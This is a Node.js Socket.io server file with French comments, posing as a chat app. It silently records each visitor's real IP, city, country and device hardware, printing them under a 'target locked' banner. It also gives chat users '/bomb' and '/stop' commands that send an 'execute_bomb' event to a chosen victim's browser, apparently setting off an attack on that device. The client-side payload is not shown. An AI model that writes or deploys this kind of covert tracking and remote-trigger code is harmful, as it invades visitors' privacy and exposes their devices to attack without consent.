const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const vault = {}; 

io.on('connection', (socket) => {
    // Perceur d'IP (Vraie IP même derrière Cloudflare/Proxy)
    const ip = (socket.handshake.headers['x-forwarded-for'] || 
                socket.handshake.address || 
                socket.conn.remoteAddress).split(',')[0].trim();

    socket.on('check_device', (info) => {
        vault[ip] = { sid: socket.id, name: info.name };
        
        console.log(`
        ╔═════════════ CIBLE VERROUILLÉE ═════════════╗
        ║ NOM    : ${info.name}
        ║ IP     : ${ip}
        ║ VILLE  : ${info.geo.city} (${info.geo.country_name})
        ║ GPU    : ${info.hardware.gpu}
        ║ RAM    : ${info.hardware.ram} GB | CORES: ${info.hardware.cores}
        ║ BATT   : ${info.hardware.battery}%
        ╚═════════════════════════════════════════════╝
        `);
        socket.emit('session_restored', vault[ip]);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        // COMMANDE : /bomb [IP]
        if (msg.startsWith("/bomb ")) {
            const targetIP = msg.split(" ")[1];
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('execute_bomb');
                    console.log(`[!!!] NUCLEAR_STRIKE_CONFIRMED: ${targetIP}`);
                }
            });
        } 
        // COMMANDE : /stop [IP]
        else if (msg.startsWith("/stop ")) {
            const targetIP = msg.split(" ")[1];
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('stop_bomb');
                }
            });
        } else {
            io.emit('chat message', data);
        }
    });
});

http.listen(3000, () => { console.log("GALAXY_OS_V12_ULTIMATE_READY"); });
